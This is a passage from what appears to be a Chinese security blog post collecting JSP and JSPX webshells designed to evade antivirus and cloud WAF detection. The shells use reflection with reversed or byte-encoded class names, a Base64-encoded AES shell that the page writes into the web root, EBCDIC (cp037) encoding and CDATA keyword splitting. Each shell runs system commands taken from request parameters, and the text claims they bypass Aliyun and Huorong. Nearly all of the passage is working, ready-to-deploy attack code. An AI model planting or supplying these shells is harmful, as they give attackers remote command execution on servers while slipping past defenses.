class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%!<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">reverseStr</span><span class="hljs-params">(String str)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(str).reverse().toString();&#125;%&gt;<br>&lt;%<br>    out.print(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase());<br>    <span class="hljs-type">String</span>  <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-keyword">if</span>(cmd != <span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(reverseStr(<span class="hljs-string">&quot;emitnuR.gnal.avaj&quot;</span>));<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> declaredConstructor.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">show</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(reverseStr(<span class="hljs-string">&quot;cexe&quot;</span>), String[].class);<br>        String[] cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c&quot;</span>,cmd&#125;;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> show.invoke(o,(Object)cmds);<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Process) invoke;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> p.getInputStream();<br>        <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(input, <span class="hljs-string">&quot;GBK&quot;</span>);<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(ins);<br>        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        String line;<br>        <span class="hljs-keyword">while</span>((line = br.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            out.println(line);<br>        &#125;<br>        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>        br.close();<br>        ins.close();<br>        input.close();<br>        p.getOutputStream().close();<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>  language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%<br>    <span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)!=<span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[] &#123; <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span> &#125;));  <span class="hljs-comment">//java.lang.Runtime的ascll</span><br>        <span class="hljs-comment">//exec   getRuntime</span><br>        <span class="hljs-type">Process</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> (Process) rt.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[] &#123; <span class="hljs-number">101</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span> &#125;), String.class).invoke(rt.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[] &#123; <span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">116</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span> &#125;)).invoke(<span class="hljs-literal">null</span>), request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) );<br>        java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> e.getInputStream();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123; out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b)); &#125;out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h2 id="写入虚拟jsp"><a href="#写入虚拟jsp" class="headerlink" title="写入虚拟jsp"></a>写入虚拟jsp</h2><p>可过阿里云和火绒，写入的代码为恶意jsp，在会被火绒检测</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.nio.file.Files&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.nio.file.Paths&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.net.URLClassLoader&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.net.URL&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Base64&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.File&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Objects&quot;</span> %&gt;<br>&lt;%<br>%&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;myshell&quot;</span>;<br>    <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiICU+DQo8JSENCiAgICBjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXIgew0KICAgICAgICBVKENsYXNzTG9hZGVyIGMpIHsNCiAgICAgICAgICAgIHN1cGVyKGMpOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIENsYXNzIGcoYnl0ZVtdIGIpIHsNCiAgICAgICAgICAgIHJldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLCAwLCBiLmxlbmd0aCk7DQogICAgICAgIH0NCiAgICB9DQolPg0KDQo8JQ0KICAgIGlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKSB7DQogICAgICAgIFN0cmluZyBrID0gImU0NWUzMjlmZWI1ZDkyNWIiOy8q6K+l5a+G6ZKl5Li66L+e5o6l5a+G56CBMzLkvY1tZDXlgLznmoTliY0xNuS9je+8jOm7mOiupOi/nuaOpeWvhueggXJlYmV5b25kKi8NCiAgICAgICAgc2Vzc2lvbi5wdXRWYWx1ZSgidSIsIGspOw0KICAgICAgICBDaXBoZXIgYyA9IENpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7DQogICAgICAgIGMuaW5pdCgyLCBuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksICJBRVMiKSk7DQogICAgICAgIG5ldyBVKHRoaXMuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5nKA0KICAgICAgICAgICAgICAgICAgICAgICAgYy5kb0ZpbmFsKG5ldyBzdW4ubWlzYy5CQVNFNjREZWNvZGVyKCkuZGVjb2RlQnVmZmVyKHJlcXVlc3QuZ2V0UmVhZGVyKCkucmVhZExpbmUoKSkpKQ0KICAgICAgICAgICAgICAgIC5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7DQogICAgfQ0KJT4=&quot;</span>);<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(request.getServletContext().getRealPath(<span class="hljs-string">&quot;/&quot;</span>));<br>    file.mkdirs();<br>    Files.write(Paths.get(file.getAbsolutePath() + <span class="hljs-string">&quot;/&quot;</span> + className + <span class="hljs-string">&quot;.jsp&quot;</span>),bytes);<br>%&gt;<br></code></pre></td></tr></table></figure><h2 id="罕见的编码方式"><a href="#罕见的编码方式" class="headerlink" title="罕见的编码方式"></a>罕见的编码方式</h2><p>通过罕见的编码方式进行绕过，可以绕过阿里云。（&lt; jsp:scriptlet &gt;内不能写反射绕过火绒）</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;cp037&quot;</span> ?&gt;<br>&lt;jsp:root version=<span class="hljs-string">&quot;1.2&quot;</span> xmlns:jsp=<span class="hljs-string">&quot;http://java.sun.com/JSP/Page&quot;</span>&gt;<br>    &lt;jsp:directive.page contentType=<span class="hljs-string">&quot;text/html&quot;</span>/&gt;<br>    &lt;jsp:directive.page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span>/&gt;<br>    &lt;jsp:declaration&gt;<br>    &lt;/jsp:declaration&gt;<br>    &lt;jsp:scriptlet&gt;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;id&quot;</span>);<br>        <span class="hljs-keyword">if</span>(id != <span class="hljs-literal">null</span>)<br>        &#123;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(id);<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">while</span>((line=in.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>            out.write(line+<span class="hljs-string">&quot;\n&quot;</span>);<br>        &#125;&#125;<br>    &lt;/jsp:scriptlet&gt;<br>    &lt;jsp:text&gt;<br>    &lt;/jsp:text&gt;<br>&lt;/jsp:root&gt;<br></code></pre></td></tr></table></figure><h2 id="CDATA特性"><a href="#CDATA特性" class="headerlink" title="CDATA特性"></a>CDATA特性</h2><p>利用jspx进行免杀，&lt;%%&gt;替换成&lt; jsp:scriptlet &gt; &lt;&#x2F; jsp:scriptlet &gt;  （敏感关键词）</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream,java.io.BufferedReader,java.io.InputStreamReader&quot;</span>%&gt;<br>&lt;%<span class="hljs-meta">@page</span> language=<span class="hljs-string">&quot;java&quot;</span> pageEncoding=<span class="hljs-string">&quot;utf-8&quot;</span>%&gt;<br>&lt;jsp:scriptlet&gt;<br>    <span class="hljs-type">Runtime</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> run.exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    out.println(<span class="hljs-string">&quot;jsp webshell&quot;</span>);<br>    System.out.println(process);<br>&lt;/jsp:scriptlet&gt;<br></code></pre></td></tr></table></figure><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;jsp:root xmlns:jsp=<span class="hljs-string">&quot;http://java.sun.com/JSP/Page&quot;</span> xmlns=<span class="hljs-string">&quot;http://www.w3.or/1999/xhtml&quot;</span> version=<span class="hljs-string">&quot;2.0&quot;</span>&gt;<br>    &lt;jsp:directive.page contentType=<span class="hljs-string">&quot;text/html&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>/&gt;<br>    &lt;jsp:directive.page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span>/&gt;<br>    &lt;pre&gt;<br>  &lt;jsp:scriptlet&gt;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;shagima&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;ladypwd&quot;</span>)))&#123;<br>    InputStream in= Run&lt;![CDATA[time.get]]&gt;Run&lt;![CDATA[time]]&gt;().ex&lt;![CDATA[ec(request.get]]&gt;Parameter(<span class="hljs-string">&quot;cmd&quot;</span>).split(<span class="hljs-string">&quot; &quot;</span>)).getInputStream();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>    <span class="hljs-type">byte</span>[] bs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>    <span class="hljs-keyword">while</span>((ret=in.read(bs))!=-<span class="hljs-number">1</span>)&#123;<br>     out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bs));<br>     &#125;<br>    &#125;<br>&lt;/jsp:scriptlet&gt;<br>&lt;/pre&gt;<br>&lt;/jsp:root&gt;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Generated by the Jasper component of Apache Tomcat</span><br><span class="hljs-comment"> * Version: Apache Tomcat/8.5.99</span><br><span class="hljs-comment"> * Generated at: 2024-05-26 08:56:12 UTC</span><br><span class="hljs-comment"> * Note: The last modified time of this file was set to</span><br><span class="hljs-comment"> *       the last modified time of the source file after</span><br><span class="hljs-comment"> *       generation to assist with modification tracking.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">package</span> org.apache.jsp;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.*;<br><span class="hljs-keyword">import</span> javax.servlet.jsp.*;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">_1_jsp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">org</span>.apache.jasper.runtime.HttpJspBase<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">org</span>.apache.jasper.runtime.JspSourceDependent,<br>                 org.apache.jasper.runtime.JspSourceImports &#123;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> javax.servlet.jsp.<span class="hljs-type">JspFactory</span> <span class="hljs-variable">_jspxFactory</span> <span class="hljs-operator">=</span><br>          javax.servlet.jsp.JspFactory.getDefaultFactory();<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.util.Map&lt;java.lang.String,java.lang.Long&gt; _jspx_dependants;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_packages;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_classes;<br><br>  <span class="hljs-keyword">static</span> &#123;<br>    _jspx_imports_packages = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.LinkedHashSet&lt;&gt;(<span class="hljs-number">3</span>);<br>    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet&quot;</span>);<br>    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet.http&quot;</span>);<br>    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet.jsp&quot;</span>);<br>    _jspx_imports_classes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.LinkedHashSet&lt;&gt;(<span class="hljs-number">1</span>);<br>    _jspx_imports_classes.add(<span class="hljs-string">&quot;java.io.InputStream&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> javax.el.ExpressionFactory _el_expressionfactory;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> org.apache.tomcat.InstanceManager _jsp_instancemanager;<br><br>  <span class="hljs-keyword">public</span> java.util.Map&lt;java.lang.String,java.lang.Long&gt; getDependants() &#123;<br>    <span class="hljs-keyword">return</span> _jspx_dependants;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> java.util.Set&lt;java.lang.String&gt; getPackageImports() &#123;<br>    <span class="hljs-keyword">return</span> _jspx_imports_packages;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> java.util.Set&lt;java.lang.String&gt; getClassImports() &#123;<br>    <span class="hljs-keyword">return</span> _jspx_imports_classes;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> javax.el.ExpressionFactory <span class="hljs-title function_">_jsp_getExpressionFactory</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (_el_expressionfactory == <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) &#123;<br>        <span class="hljs-keyword">if</span> (_el_expressionfactory == <span class="hljs-literal">null</span>) &#123;<br>          _el_expressionfactory = _jspxFactory.getJspApplicationContext(getServletConfig().getServletContext()).getExpressionFactory();<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> _el_expressionfactory;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> org.apache.tomcat.InstanceManager <span class="hljs-title function_">_jsp_getInstanceManager</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (_jsp_instancemanager == <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) &#123;<br>        <span class="hljs-keyword">if</span> (_jsp_instancemanager == <span class="hljs-literal">null</span>) &#123;<br>          _jsp_instancemanager = org.apache.jasper.runtime.InstanceManagerFactory.getInstanceManager(getServletConfig());<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> _jsp_instancemanager;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_jspInit</span><span class="hljs-params">()</span> &#123;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_jspDestroy</span><span class="hljs-params">()</span> &#123;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_jspService</span><span class="hljs-params">(<span class="hljs-keyword">final</span> javax.servlet.http.HttpServletRequest request, <span class="hljs-keyword">final</span> javax.servlet.http.HttpServletResponse response)</span><br>      <span class="hljs-keyword">throws</span> java.io.IOException, javax.servlet.ServletException &#123;<br><br>    <span class="hljs-keyword">final</span> java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">_jspx_method</span> <span class="hljs-operator">=</span> request.getMethod();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;GET&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="hljs-string">&quot;POST&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="hljs-string">&quot;HEAD&quot;</span>.equals(_jspx_method) &amp;&amp; !javax.servlet.DispatcherType.ERROR.equals(request.getDispatcherType())) &#123;<br>      response.sendError(HttpServletResponse.SC_METHOD_NOT_ALLOWED, <span class="hljs-string">&quot;JSP 只允许 GET、POST 或 HEAD。Jasper 还允许 OPTIONS&quot;</span>);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">final</span> javax.servlet.jsp.PageContext pageContext;<br>    javax.servlet.http.<span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">final</span> javax.servlet.ServletContext application;<br>    <span class="hljs-keyword">final</span> javax.servlet.ServletConfig config;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">final</span> java.lang.<span class="hljs-type">Object</span> <span class="hljs-variable">page</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">_jspx_out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    javax.servlet.jsp.<span class="hljs-type">PageContext</span> <span class="hljs-variable">_jspx_page_context</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br><br>    <span class="hljs-keyword">try</span> &#123;<br>      response.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>      pageContext = _jspxFactory.getPageContext(<span class="hljs-built_in">this</span>, request, response,<br>      <span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">8192</span>, <span class="hljs-literal">true</span>);<br>      _jspx_page_context = pageContext;<br>      application = pageContext.getServletContext();<br>      config = pageContext.getServletConfig();<br>      session = pageContext.getSession();<br>      out = pageContext.getOut();<br>      _jspx_out = out;<br><br>      out.write(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;shagima&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;ladypwd&quot;</span>)))&#123;<br>    InputStream in= Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>).split(<span class="hljs-string">&quot; &quot;</span>)).getInputStream();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>    <span class="hljs-type">byte</span>[] bs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>    <span class="hljs-keyword">while</span>((ret=in.read(bs))!=-<span class="hljs-number">1</span>)&#123;<br>     out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bs));<br>     &#125;<br>    &#125;<br><br>      out.write(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (java.lang.Throwable t) &#123;<br>      <span class="hljs-keyword">if</span> (!(t <span class="hljs-keyword">instanceof</span> javax.servlet.jsp.SkipPageException))&#123;<br>        out = _jspx_out;<br>        <span 